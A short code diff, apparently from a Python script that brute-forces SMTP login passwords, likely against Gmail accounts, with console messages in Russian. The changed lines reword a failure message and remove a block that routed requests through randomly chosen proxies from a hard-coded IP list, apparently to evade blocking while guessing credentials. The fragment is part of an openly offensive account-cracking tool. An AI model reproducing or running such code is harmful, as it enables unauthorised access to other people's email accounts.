@@ -60,14 +60,6 @@ for password in pass_found:
        print(Fore.GREEN + '[+] Пароль найден: ' + password)
        break;
    except smtplib.SMTPAuthenticationError:
-      print(Fore.RED + '[-] Поиск пароля')
+      print(Fore.RED + '[-] Пароль не найден')
       print("")
-      go = ['120.203.215.6:80', '78.41.246.137:80', '104.202.117.238:80', '104.202.117.53:80', '104.202.117.106']
-      jo = random.choice(go)
-      url = 'http://smtp.googlemail.com'
-      proxies = {'https': jo}
-      response = requests.get(url=url, proxies=proxies)
-      html = BS(response.content, 'html.parser')
-      print(html)
-      print(response.status_code)
 input()
